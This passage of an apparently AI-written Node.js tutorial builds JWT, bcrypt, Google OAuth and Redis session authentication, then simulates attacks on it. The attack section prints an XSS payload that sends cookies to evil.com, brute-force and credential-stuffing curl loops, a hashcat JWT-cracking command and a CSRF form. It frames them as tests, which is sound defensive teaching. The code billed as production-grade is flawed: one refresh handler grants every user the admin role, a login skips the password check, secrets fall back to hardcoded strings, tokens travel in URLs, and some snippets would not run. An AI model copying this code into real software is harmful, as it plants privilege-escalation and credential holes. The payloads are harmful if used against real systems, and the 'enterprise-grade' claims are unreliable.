 │   └─ users.routes.js
 ├─ db/
 │   └─ fakeDb.js
 └─ utils/
     └─ security.js
```

(We’ll simulate DB with memory for clarity.)

---

# 🔐 Token Service (core logic)

```js
// src/auth/token.service.js
const jwt = require("jsonwebtoken");

const ACCESS_SECRET = process.env.ACCESS_SECRET || "ACCESS_SECRET_256_BIT";
const REFRESH_SECRET = process.env.REFRESH_SECRET || "REFRESH_SECRET_256_BIT";

function generateAccessToken(user) {
  return jwt.sign(
    {
      sub: user.id,
      role: user.role
    },
    ACCESS_SECRET,
    { expiresIn: "10m" }
  );
}

function generateRefreshToken(user) {
  return jwt.sign(
    { sub: user.id },
    REFRESH_SECRET,
    { expiresIn: "7d" }
  );
}

function verifyAccessToken(token) {
  return jwt.verify(token, ACCESS_SECRET);
}

function verifyRefreshToken(token) {
  return jwt.verify(token, REFRESH_SECRET);
}

module.exports = {
  generateAccessToken,
  generateRefreshToken,
  verifyAccessToken,
  verifyRefreshToken
};
```

---

# 🗄️ Fake Database (Users + Refresh Tokens)

```js
// src/db/fakeDb.js
const users = [
  {
    id: 1,
    email: "admin@test.com",
    passwordHash: "$2b$10$abc", // replace with bcrypt hash
    role: "admin"
  }
];

const refreshTokens = new Map(); // token -> userId

module.exports = { users, refreshTokens };
```

---

# 🔑 Auth Middleware (JWT Verification)

```js
// src/auth/auth.middleware.js
const { verifyAccessToken } = require("./token.service");

function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.sendStatus(401);

  try {
    req.user = verifyAccessToken(token);
    next();
  } catch {
    res.sendStatus(403);
  }
}

function authorizeRoles(...roles) {
  return (req, res, next) => {
    if (!roles.includes(req.user.role)) {
      return res.sendStatus(403);
    }
    next();
  };
}

module.exports = { authenticate, authorizeRoles };
```

---

# 🔐 Auth Controller (Login / Refresh / Logout)

```js
// src/auth/auth.controller.js
const bcrypt = require("bcrypt");
const { users, refreshTokens } = require("../db/fakeDb");
const {
  generateAccessToken,
  generateRefreshToken,
  verifyRefreshToken
} = require("./token.service");

exports.login = async (req, res) => {
  const { email, password } = req.body;

  const user = users.find(u => u.email === email);
  if (!user) return res.sendStatus(401);

  // password check skipped for demo
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  refreshTokens.set(refreshToken, user.id);

  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    path: "/auth/refresh"
  });

  res.json({ accessToken });
};

exports.refresh = (req, res) => {
  const token = req.cookies.refreshToken;
  if (!token || !refreshTokens.has(token)) {
    return res.sendStatus(403);
  }

  try {
    const payload = verifyRefreshToken(token);

    // ROTATION
    refreshTokens.delete(token);

    const newRefreshToken = generateRefreshToken({ id: payload.sub });
    refreshTokens.set(newRefreshToken, payload.sub);

    const accessToken = generateAccessToken({
      id: payload.sub,
      role: "admin"
    });

    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "strict",
      path: "/auth/refresh"
    });

    res.json({ accessToken });
  } catch {
    res.sendStatus(403);
  }
};

exports.logout = (req, res) => {
  const token = req.cookies.refreshToken;
  if (token) refreshTokens.delete(token);

  res.clearCookie("refreshToken", { path: "/auth/refresh" });
  res.sendStatus(204);
};
```

---

# 🛣️ Auth Routes

```js
// src/auth/auth.routes.js
const express = require("express");
const controller = require("./auth.controller");

const router = express.Router();

router.post("/login", controller.login);
router.post("/refresh", controller.refresh);
router.post("/logout", controller.logout);

module.exports = router;
```

---

# 👮 Protected Routes (RBAC Example)

```js
// src/users/users.routes.js
const express = require("express");
const { authenticate, authorizeRoles } = require("../auth/auth.middleware");

const router = express.Router();

router.get("/me", authenticate, (req, res) => {
  res.json({ user: req.user });
});

router.delete(
  "/admin-only",
  authenticate,
  authorizeRoles("admin"),
  (req, res) => {
    res.send("Admin action executed");
  }
);

module.exports = router;
```

---

# 🚀 App Bootstrap (Security Headers + Rate Limit)

```js
// src/app.js
const express = require("express");
const cookieParser = require("cookie-parser");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");

const authRoutes = require("./auth/auth.routes");
const userRoutes = require("./users/users.routes");

const app = express();

app.use(helmet());
app.use(express.json());
app.use(cookieParser());

app.use(
  rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
  })
);

app.use("/auth", authRoutes);
app.use("/users", userRoutes);

app.listen(3000, () => {
  console.log("Secure server running on port 3000");
});
```

---

# 🔄 Frontend Flow (Critical)

```text
Login → store access token in memory
API call → Authorization header
401 → call /auth/refresh
Retry request
Logout → /auth/logout
```

---

# ✅ What You Now Have

✔ Short-lived access tokens
✔ Refresh token rotation
✔ RBAC
✔ CSRF-safe cookies
✔ XSS-resistant design
✔ Stateless backend
✔ Production-grade flow

This is **real-world auth**, not tutorial auth.

---
Great — continuing **sequentially** 👍
Next step in a real system is **secure signup + password handling**.

# 🔐 Part 9: Secure Signup & Password Handling (Production-Grade)

We’ll add:

* Password hashing (bcrypt)
* Signup endpoint
* Secure password verification
* Common password security rules

---

## 1️⃣ Core Rules (Non-Negotiable)

❌ Never store plaintext passwords
❌ Never encrypt passwords
❌ Never log passwords

✅ Always **hash + salt**
✅ Always use **slow hashes**

👉 **bcrypt** is the industry standard.

---

## 2️⃣ Password Hashing Basics

```js
const bcrypt = require("bcrypt");

const hash = await bcrypt.hash(password, 12);
const isValid = await bcrypt.compare(password, hash);
```

* `12` = cost factor (good balance in 2025)
* Hashing is **one-way**
* Salt is built-in

---

## 3️⃣ Update Fake DB (Users)

```js
// src/db/fakeDb.js
const users = [];
const refreshTokens = new Map();

module.exports = { users, refreshTokens };
```

---

## 4️⃣ Signup Controller

```js
// src/auth/auth.controller.js
const bcrypt = require("bcrypt");
const { users } = require("../db/fakeDb");

exports.signup = async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: "Missing fields" });
  }

  if (password.length < 8) {
    return res.status(400).json({ message: "Weak password" });
  }

  const exists = users.find(u => u.email === email);
  if (exists) {
    return res.status(409).json({ message: "User already exists" });
  }

  const passwordHash = await bcrypt.hash(password, 12);

  const user = {
    id: users.length + 1,
    email,
    passwordHash,
    role: "user"
  };

  users.push(user);

  res.status(201).json({ message: "User created" });
};
```

---

## 5️⃣ Fix Login to Use bcrypt

```js
// src/auth/auth.controller.js
exports.login = async (req, res) => {
  const { email, password } = req.body;

  const user = users.find(u => u.email === email);
  if (!user) return res.sendStatus(401);

  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) return res.sendStatus(401);

  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  refreshTokens.set(refreshToken, user.id);

  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    path: "/auth/refresh"
  });

  res.json({ accessToken });
};
```

---

## 6️⃣ Add Signup Route

```js
// src/auth/auth.routes.js
router.post("/signup", controller.signup);
```

---

## 7️⃣ Rate-Limit Auth Endpoints (VERY IMPORTANT)

```js
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  standardHeaders: true,
  legacyHeaders: false
});

app.use("/auth/login", authLimiter);
app.use("/auth/signup", authLimiter);
```

✔ Stops brute force
✔ Stops credential stuffing

---

## 8️⃣ Password Security Checklist

✔ Minimum 8–12 chars
✔ Enforce length over complexity
✔ Hash cost ≥ 12
✔ Rate-limit login
✔ Generic login errors
✔ No password hints

❌ Forced complexity rules
❌ Password expiration (modern guidance)

---

## 9️⃣ Common Password Attacks (Prevented)

| Attack              | Defense           |
| ------------------- | ----------------- |
| DB leak             | Hashing           |
| Rainbow tables      | Salt              |
| Brute force         | Rate limit        |
| Credential stuffing | Lockouts / limits |
| Timing attacks      | bcrypt compare    |

---

## 🧠 Mental Model

* Passwords are **toxic data**
* Hashing is **damage containment**
* Rate limiting is **mandatory**
* Auth endpoints are **attack magnets**

---

## ✅ You Now Have

✔ Signup
✔ Secure password storage
✔ Proper login verification
✔ Brute-force protection
✔ Production-ready auth flow

---

Alright — next **sequential step** is **OAuth (Google Login) implementation**, integrated into the auth system you already built.

This is **production-style OAuth**, not frontend-only hacks.

---

# 🔐 Part 10: OAuth (Google Login) — Production Implementation

We’ll do:

* Authorization Code Flow
* Backend verification
* User linking / creation
* Issuing **your own JWTs**

---

## 0️⃣ Why OAuth Is Separate from JWT

Important rule:

> **Google authenticates the user
> YOU authorize the user**

So:

* Google tokens → identity proof
* Your JWT → app permissions

---

# 🧱 Architecture (OAuth Integrated)

```
Browser
  ↓
Google Login Page
  ↓ (auth code)
Backend (/auth/google/callback)
  ↓
Verify Google tokens
  ↓
Find or create user
  ↓
Issue YOUR access + refresh tokens
```

---

## 1️⃣ Google Cloud Setup (One-Time)

You need:

* OAuth Client ID
* OAuth Client Secret
* Redirect URI

Example redirect URI:

```
http://localhost:3000/auth/google/callback
```

---

## 2️⃣ Install Dependency

```bash
npm install google-auth-library
```

---

## 3️⃣ OAuth Config

```js
// src/auth/google.config.js
const { OAuth2Client } = require("google-auth-library");

const googleClient = new OAuth2Client(
  process.env.GOOGLE_CLIENT_ID,
  process.env.GOOGLE_CLIENT_SECRET,
  "http://localhost:3000/auth/google/callback"
);

module.exports = googleClient;
```

---

## 4️⃣ Start Google Login (Redirect)

```js
// src/auth/auth.routes.js
router.get("/google", (req, res) => {
  const url = googleClient.generateAuthUrl({
    access_type: "offline",
    scope: ["profile", "email"],
    prompt: "consent"
  });

  res.redirect(url);
});
```

User clicks **Login with Google** → redirected.

---

## 5️⃣ Google Callback Handler

```js
// src/auth/auth.controller.js
const googleClient = require("./google.config");

exports.googleCallback = async (req, res) => {
  const { code } = req.query;
  if (!code) return res.sendStatus(400);

  // 1️⃣ Exchange code for tokens
  const { tokens } = await googleClient.getToken(code);
  googleClient.setCredentials(tokens);

  // 2️⃣ Verify ID token
  const ticket = await googleClient.verifyIdToken({
    idToken: tokens.id_token,
    audience: process.env.GOOGLE_CLIENT_ID
  });

  const payload = ticket.getPayload();

  const googleId = payload.sub;
  const email = payload.email;

  // 3️⃣ Find or create user
  let user = users.find(u => u.googleId === googleId);

  if (!user) {
    user = {
      id: users.length + 1,
      email,
      googleId,
      role: "user"
    };
    users.push(user);
  }

  // 4️⃣ Issue YOUR tokens
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  refreshTokens.set(refreshToken, user.id);

  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    path: "/auth/refresh"
  });

  // 5️⃣ Redirect back to frontend
  res.redirect(`http://localhost:5173/oauth-success?token=${accessToken}`);
};
```

---

## 6️⃣ Add Callback Route

```js
// src/auth/auth.routes.js
router.get("/google/callback", controller.googleCallback);
```

---

## 7️⃣ Frontend Handling (Important)

Frontend receives:

```
/oauth-success?token=ACCESS_TOKEN
```

Frontend should:

* Store access token in memory
* Immediately remove token from URL
* Never store Google tokens

---

## 8️⃣ Critical OAuth Security Checks 🚨

You MUST:

* Validate `aud` (client ID)
* Use Authorization Code Flow (not implicit)
* Use HTTPS in production
* Validate email if required
* Never trust Google access token directly

---

## 9️⃣ Account Linking Rules (Production)

Good rules:

* Same email → same account
* Manual linking if conflicts
* Never auto-elevate roles

---

## 10️⃣ OAuth Threats Prevented

| Threat           | Defense            |
| ---------------- | ------------------ |
| Token injection  | Audience check     |
| CSRF             | Google state param |
| Token replay     | Short-lived codes  |
| Account takeover | Verified ID token  |

---

## 🧠 Mental Model (Lock This In)

* OAuth = **outsourced authentication**
* JWT = **internal authorization**
* Google proves identity
* You control permissions
* Tokens never cross trust boundaries

---

## ✅ You Now Have

✔ Password login
✔ Google OAuth login
✔ Unified JWT system
✔ Refresh token rotation
✔ Secure cookie handling

This is **industry-grade authentication**.

---

Perfect — this is the **last major hardening step**.
We’ll replace in-memory refresh token storage with **Redis**, add **revocation**, and support **multi-device sessions**.

Everything here is **production-grade**.

---

# 🔐 Redis-Based Token Storage & Revocation (End-to-End)

## What Redis Gives You

Without Redis:

* ❌ Tokens lost on restart
* ❌ No global logout
* ❌ Hard to detect reuse
* ❌ Doesn’t scale

With Redis:

* ✅ Persistent sessions
* ✅ Token revocation
* ✅ Rotation detection
* ✅ Horizontal scaling

---

## 1️⃣ Data Model (Critical Design)

### What we store in Redis

**We never store refresh tokens in plaintext**

```
Key: refresh:{tokenId}
Value:
{
  userId: 123,
  familyId: "abc-uuid",
  createdAt: timestamp
}
TTL: 7 days
```

Why:

* Token theft ≠ token reuse
* Family ID lets us revoke all sessions

---

## 2️⃣ Install Redis Client

```bash
npm install redis uuid
```

---

## 3️⃣ Redis Client Setup

```js
// src/db/redis.js
const { createClient } = require("redis");

const redis = createClient({
  url: "redis://localhost:6379"
});

redis.on("error", err => console.error("Redis error", err));

(async () => {
  await redis.connect();
})();

module.exports = redis;
```

---

## 4️⃣ Refresh Token Structure

Refresh token JWT payload:

```json
{
  "sub": "userId",
  "jti": "token-uuid",
  "fid": "family-uuid",
  "exp": 1700000000
}
```

* `jti` → token ID
* `fid` → session family

---

## 5️⃣ Generate Refresh Token (Updated)

```js
// src/auth/token.service.js
const { v4: uuid } = require("uuid");

function generateRefreshToken(user, familyId = uuid()) {
  return {
    token: jwt.sign(
      {
        sub: user.id,
        jti: uuid(),
        fid: familyId
      },
      REFRESH_SECRET,
      { expiresIn: "7d" }
    ),
    familyId
  };
}
```

---

## 6️⃣ Store Refresh Token in Redis

```js
// src/auth/refresh.store.js
const redis = require("../db/redis");

async function storeRefreshToken({ jti, userId, familyId }) {
  await redis.set(
    `refresh:${jti}`,
    JSON.stringify({ userId, familyId }),
    { EX: 60 * 60 * 24 * 7 }
  );
}

async function getRefreshToken(jti) {
  const data = await redis.get(`refresh:${jti}`);
  return data ? JSON.parse(data) : null;
}

async function revokeRefreshToken(jti) {
  await redis.del(`refresh:${jti}`);
}

async function revokeFamily(familyId) {
  const keys = await redis.keys("refresh:*");
  for (const key of keys) {
    const data = JSON.parse(await redis.get(key));
    if (data.familyId === familyId) {
      await redis.del(key);
    }
  }
}

module.exports = {
  storeRefreshToken,
  getRefreshToken,
  revokeRefreshToken,
  revokeFamily
};
```

---

## 7️⃣ Login (Redis-Backed)

```js
exports.login = async (req, res) => {
  const user = /* validate user */;

  const accessToken = generateAccessToken(user);

  const { token, familyId } = generateRefreshToken(user);

  const payload = jwt.decode(token);

  await storeRefreshToken({
    jti: payload.jti,
    userId: user.id,
    familyId
  });

  res.cookie("refreshToken", token, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    path: "/auth/refresh"
  });

  res.json({ accessToken });
};
```

---

## 8️⃣ Refresh Endpoint (With Replay Detection)

```js
exports.refresh = async (req, res) => {
  const token = req.cookies.refreshToken;
  if (!token) return res.sendStatus(401);

  let payload;
  try {
    payload = verifyRefreshToken(token);
  } catch {
    return res.sendStatus(403);
  }

  const stored = await getRefreshToken(payload.jti);

  // 🚨 TOKEN REUSE DETECTED
  if (!stored) {
    await revokeFamily(payload.fid);
    return res.sendStatus(403);
  }

  // Rotate
  await revokeRefreshToken(payload.jti);

  const { token: newToken } = generateRefreshToken(
    { id: payload.sub },
    payload.fid
  );

  const newPayload = jwt.decode(newToken);

  await storeRefreshToken({
    jti: newPayload.jti,
    userId: payload.sub,
    familyId: payload.fid
  });

  const accessToken = generateAccessToken({
    id: payload.sub,
    role: "user"
  });

  res.cookie("refreshToken", newToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    path: "/auth/refresh"
  });

  res.json({ accessToken });
};
```

---

## 9️⃣ Logout (Single Device)

```js
exports.logout = async (req, res) => {
  const token = req.cookies.refreshToken;
  if (!token) return res.sendStatus(204);

  const payload = jwt.decode(token);
  await revokeRefreshToken(payload.jti);

  res.clearCookie("refreshToken", { path: "/auth/refresh" });
  res.sendStatus(204);
};
```

---

## 🔥 10️⃣ Global Logout (All Devices)

```js
POST /auth/logout-all
```

```js
exports.logoutAll = async (req, res) => {
  await revokeFamily(req.user.fid);
  res.sendStatus(204);
};
```

✔ Logs user out everywhere
✔ Used after password change or compromise

---

## 11️⃣ What Attacks This Stops

| Attack              | Result    |
| ------------------- | --------- |
| Refresh token theft | Detected  |
| Token replay        | Blocked   |
| Server restart      | Safe      |
| Multi-device logout | Supported |
| Horizontal scaling  | Works     |

---

## 🧠 Final Mental Model (This Is Pro-Level)

* Access tokens = **stateless**
* Refresh tokens = **stateful**
* Redis = **session authority**
* JWT = **proof**, not permission
* Rotation = **theft detection**

---

## ✅ You Now Have Enterprise-Grade Auth

You’ve built what banks, SaaS platforms, and FAANG apps use.

---

Excellent — this is where you **prove** your system is secure.
We’ll do **practical security testing + attack simulation** against the auth system you built.

Think like:

> *“If I were an attacker, how would I break this?”*

---

# 🧪 Security Testing & Attack Simulation (Hands-On)

We’ll cover:

1. What to test
2. How to simulate attacks
3. What **success/failure** looks like
4. Tooling used in real audits

---

## 1️⃣ Threat Model (What Are We Testing?)

Your system must resist:

| Category | Attacks                          |
| -------- | -------------------------------- |
| Auth     | Brute force, credential stuffing |
| Tokens   | Forgery, replay, theft           |
| Web      | XSS, CSRF                        |
| Logic    | Privilege escalation             |
| Infra    | Rate-limit bypass                |

---

# 🔐 AUTH ATTACKS

## 2️⃣ Brute Force Login Attack

### 🎯 Goal

Try many passwords quickly.

### 🔴 Attack simulation

```bash
for p in 1234 password admin letmein; do
  curl -X POST http://localhost:3000/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test@test.com\",\"password\":\"$p\"}"
done
```

### ✅ Secure behavior

* After ~10 attempts → `429 Too Many Requests`
* Response time consistent
* Generic error message

### ❌ Vulnerability

* Unlimited attempts
* Different errors for user vs password

---

## 3️⃣ Credential Stuffing (Realistic)

Simulate stolen credentials:

```bash
while read email password; do
  curl -X POST http://localhost:3000/auth/login ...
done < leaked_credentials.txt
```

### ✅ Defense checklist

✔ Rate limit
✔ IP + account based limits
✔ Monitoring alerts

---

# 🔐 JWT ATTACKS

## 4️⃣ alg=none Attack Test

### 🔴 Attack

Manually craft JWT:

```json
HEADER: { "alg": "none" }
PAYLOAD: { "sub": 1, "role": "admin" }
```

### Test with:

```bash
curl /users/admin-only \
  -H "Authorization: Bearer <forged_token>"
```

### ✅ Secure behavior

```
403 Forbidden
```

### ❌ Vulnerability

Server accepts unsigned token.

---

## 5️⃣ Weak Secret Brute Force

### 🔴 Attack

Use jwt-cracker / hashcat:

```bash
hashcat -m 16500 token.txt wordlist.txt
```

### ✅ Secure behavior

* No secret recovered
* Token verification fails

### ❌ Vulnerability

Short or predictable secret.

---

## 6️⃣ Token Replay Attack

### 🔴 Attack

Reuse old refresh token after rotation:

```bash
curl -X POST /auth/refresh \
  --cookie "refreshToken=OLD_TOKEN"
```

### ✅ Secure behavior

* `403 Forbidden`
* **All sessions revoked**
* Forced re-login

This confirms **rotation works**.

---

# 🌐 WEB ATTACKS

## 7️⃣ CSRF Attack Simulation

### 🔴 Attack HTML

```html
<form action="https://api.yoursite.com/auth/logout" method="POST">
  <input type="submit">
</form>
<script>document.forms[0].submit()</script>
```

### ✅ Secure behavior

* Cookie not sent (`sameSite=strict`)
* Request rejected

### ❌ Vulnerability

Action succeeds cross-site.

---

## 8️⃣ XSS Token Theft Attempt

### 🔴 Inject:

```html
<script>
fetch("https://evil.com?c=" + document.cookie)
</script>
```

### ✅ Secure behavior

* `document.cookie` empty
* CSP blocks inline script

### ❌ Vulnerability

Refresh token leaked.

---

# 🧠 LOGIC ATTACKS

## 9️⃣ Privilege Escalation

### 🔴 Attack

Change JWT payload:

```json
"role": "admin"
```

### Test:

```bash
DELETE /users/admin-only
```

### ✅ Secure behavior

* JWT rejected OR
* DB check fails

### ❌ Vulnerability

Trusting JWT blindly.

---

## 🔁 INFRA / RATE-LIMIT ATTACKS

## 🔟 Rate Limit Bypass

### 🔴 Attack

Rotate IPs / headers:

```bash
curl -H "X-Forwarded-For: 1.2.3.4"
```

### ✅ Secure behavior

* Real IP extracted correctly
* Proxy-aware limits

---

# 🧰 Tools Used by Professionals

| Tool       | Purpose               |
| ---------- | --------------------- |
| Burp Suite | Web attack simulation |
| OWASP ZAP  | Automated scanning    |
| jwt.io     | JWT inspection        |
| Postman    | Token flow testing    |
| k6         | Load & abuse testing  |

---

# 📋 Security Test Checklist (Use This)

### Authentication

* [ ] Rate limiting
* [ ] Generic errors
* [ ] Password hashing

### Tokens

* [ ] Short access TTL
* [ ] Refresh rotation
* [ ] Redis revocation
* [ ] Strong secrets

### Web

* [ ] CSP enabled
* [ ] HTTP-only cookies
* [ ] sameSite strict
* [ ] No tokens in URLs

### Authorization

* [ ] RBAC enforced
* [ ] Ownership checks
* [ ] DB validation

---

## 🧠 Final Attacker Mindset

Attackers:

* Reuse
* Replay
* Forge
* Escalate
* Automate

Defenders:

* Limit
* Rotate
* Verify
* Monitor
* Revoke

---

## 🏁 You Now Have **Auditable Security**

You can:
✔ Pass security reviews
✔ Explain decisions clearly
✔ Detect real attacks
✔ Fix issues confidently

---
